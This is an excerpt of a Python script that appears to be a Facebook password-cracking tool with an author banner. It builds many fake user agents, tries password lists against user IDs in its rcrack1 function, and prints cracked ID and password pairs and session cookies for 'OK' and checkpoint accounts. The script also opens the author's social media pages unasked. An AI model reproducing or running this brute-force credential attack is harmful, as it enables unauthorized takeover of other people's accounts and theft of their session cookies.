#Create By: shamshad
#FaceBook: SHADU KHaN
#GitHub: https://github.com/shamshadussain209
#---------------------------------------------------------------------------#
...
for xd in range(10000):
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/shamshadhussain209')
logo = ("""\033[38;5;48m
...
\033[38;5;96m\033[47m B \x1b[0m\033[38;5;196m DEVELOPER   :   shamshad
\033[38;5;97m\033[47m O \x1b[0m\033[38;5;197m GITHUB      :   SHAMSHAD-HUSSAIN
...
class Main:
    def __init__(self):
        ...
        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Mumit =input("[?] Choose : ")
        os.system('xdg-open https://www.facebook.com/shamshad.hussain.5815255?ref=share_group_link')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mshamshad \033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[shamshad💋] {uid} | {ps}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[shamshad-cp] {cid} | {ps}")
                ...
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[shamshad ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
Main()
